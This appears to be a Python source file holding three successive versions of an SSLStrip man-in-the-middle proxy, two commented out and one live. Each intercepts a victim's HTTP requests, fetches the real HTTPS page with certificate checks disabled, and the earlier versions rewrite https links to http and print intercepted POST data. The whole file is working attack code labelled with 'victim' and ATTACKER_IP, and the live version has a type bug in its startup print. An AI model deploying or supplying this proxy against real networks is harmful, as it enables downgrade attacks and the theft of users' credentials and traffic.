# # import BaseHTTPServer
# # import SocketServer
# # import ssl
# # import urllib2

# # class SSLStripProxy(BaseHTTPServer.BaseHTTPRequestHandler):
# #     def do_GET(self):
# #         host = self.headers.get('Host')
# #         url = 'https://' + host + self.path

# #         print("Intercepted GET request %s" % (url))

# #         # Try to fetch the GET requests from the HTTPS server and send it back to victim as HTTP
# #         try:
# #             req = urllib2.Request(url)
# #             for k in self.headers:
# #                 req.add_header(k, self.headers[k])
# #             # Allow unverified SSL context to avoid certificate errors
# #             context = ssl._create_unverified_context()
# #             response = urllib2.urlopen(req, context=context)
# #             content = response.read()

# #             # Rewrite links from https to http
# #             content = content.replace('https://', 'http://')
# #             self.send_response(200)
# #             self.send_header('Content-type', response.info().getheader('Content-Type'))
# #             self.end_headers()
# #             self.wfile.write(content)
# #         # Raise a 502 error if the request fails
# #         except Exception as e:
# #             self.send_error(502, 'Bad gateway: {}'.format(e))

# #     def do_POST(self):
# #         host = self.headers.get('Host')
# #         url = 'https://' + host + self.path
# #         content_length = int(self.headers.get('Content-Length', 0))
# #         post_data = self.rfile.read(content_length)

# #         print("Intercepted POST request %s: %s" % (url, post_data))

# #         # Try to fetch the POST requests from the HTTPS server and send it back to victim as HTTP
# #         try:
# #             req = urllib2.Request(url, data=post_data)
# #             for k in self.headers:
# #                 req.add_header(k, self.headers[k])
# #             # Allow unverified SSL context to avoid certificate errors
# #             context = ssl._create_unverified_context()
# #             response = urllib2.urlopen(req, context=context)
# #             content = response.read()

# #             # Rewrite links again
# #             content = content.replace('https://', 'http://')
# #             self.send_response(200)
# #             self.send_header('Content-type', response.info().getheader('Content-Type'))
# #             self.end_headers()
# #             self.wfile.write(content)
# #         # Raise a 502 error if the request fails
# #         except Exception as e:
# #             self.send_error(502, 'Bad gateway: {}'.format(e))

# # def run_proxy(port=80):
# #     httpd = SocketServer.TCPServer(("", port), SSLStripProxy)
# #     print("SSL Strip Proxy running on port %d..." % port)
# #     try:
# #         httpd.serve_forever()
# #     except KeyboardInterrupt:
# #         print("\nShutting down proxy.")
# #         httpd.shutdown()

# import socket
# import threading
# import requests
# import ssl

# PROXY_PORT = 80
# BUFFER_SIZE = 8192

# def handle_client(client_socket):
#     try:
#         request = client_socket.recv(BUFFER_SIZE).decode(errors='ignore')
#         if not request:
#             return

#         first_line = request.split('\n')[0]
#         parts = first_line.split()
#         if len(parts) < 3:
#             return

#         method, path, _ = parts

#         # Extract Host header
#         host_line = next((line for line in request.split('\n') if line.lower().startswith("host:")), None)
#         if not host_line:
#             print("[-] No Host header found in request.")
#             return
#         host = host_line.split(':', 1)[1].strip()

#         # Construct full HTTPS URL
#         url = f"https://{host}{path}"
#         print(f"[+] Forwarding {method} request to {url}")

#         # Forward request to actual HTTPS server
#         response = requests.request(method, url, verify=False, timeout=5)

#         # Replace https:// links with http:// to strip SSL
#         body = response.text.replace("https://", "http://")

#         # Build HTTP response headers
#         headers = (
#             f"HTTP/1.1 {response.status_code} OK\r\n"
#             f"Content-Type: {response.headers.get('Content-Type', 'text/html')}\r\n"
#             f"Content-Length: {len(body.encode())}\r\n"
#             f"Connection: close\r\n"
#             f"\r\n"
#         )

#         # Send headers + body to victim
#         client_socket.sendall(headers.encode() + body.encode())

#     except requests.exceptions.RequestException as e:
#         print(f"[-] HTTPS request error: {e}")
#         error_response = (
#             "HTTP/1.1 502 Bad Gateway\r\n"
#             "Content-Type: text/plain\r\n"
#             "Content-Length: 25\r\n"
#             "\r\n"
#             "SSLStrip failed to fetch.\r\n"
#         )
#         client_socket.sendall(error_response.encode())

#     except Exception as e:
#         print(f"[-] Proxy handler error: {e}")

#     finally:
#         client_socket.close()

# def start_proxy():
#     print(f"[*] Starting SSLStrip proxy on port {PROXY_PORT} (Windows)...")
#     server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
#     server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
#     server.bind(('0.0.0.0', PROXY_PORT))
#     server.listen(100)

#     print("[*] Waiting for HTTP connections from victim...")

#     while True:
#         client_sock, addr = server.accept()
#         print(f"[+] Got connection from {addr[0]}")
#         threading.Thread(target=handle_client, args=(client_sock,), daemon=True).start()


from BaseHTTPServer import BaseHTTPRequestHandler, HTTPServer
import httplib
import ssl
import urlparse

ATTACKER_IP = "0.0.0.0"
ATTACKER_PORT = 8080

class SSLStripProxy(BaseHTTPRequestHandler):
    def do_GET(self):
        host = self.headers.getheader('Host', '')
        url = "https://{}{}".format(host, self.path)
        print ("[+] Victim requested:" + url)

        try:
            # Parse URL manually
            parsed = urlparse.urlparse(url)
            conn = httplib.HTTPSConnection(parsed.hostname, parsed.port or 443, context=ssl._create_unverified_context())

            # Forward the original path and headers (basic)
            conn.request("GET", parsed.path + ("?" + parsed.query if parsed.query else ""), headers=self.headers.dict)

            # Get response
            resp = conn.getresponse()
            content = resp.read()

            # Send back to victim
            self.send_response(resp.status)
            self.send_header("Content-type", resp.getheader('Content-Type', 'text/html'))
            self.end_headers()
            self.wfile.write(content)

        except Exception as e:
            self.send_error(502, "SSLStrip failed: {}".format(e))

if __name__ == "__main__":
    print ("[*] Starting SSLStrip proxy on port" + ATTACKER_PORT)
    httpd = HTTPServer((ATTACKER_IP, ATTACKER_PORT), SSLStripProxy)
    httpd.serve_forever()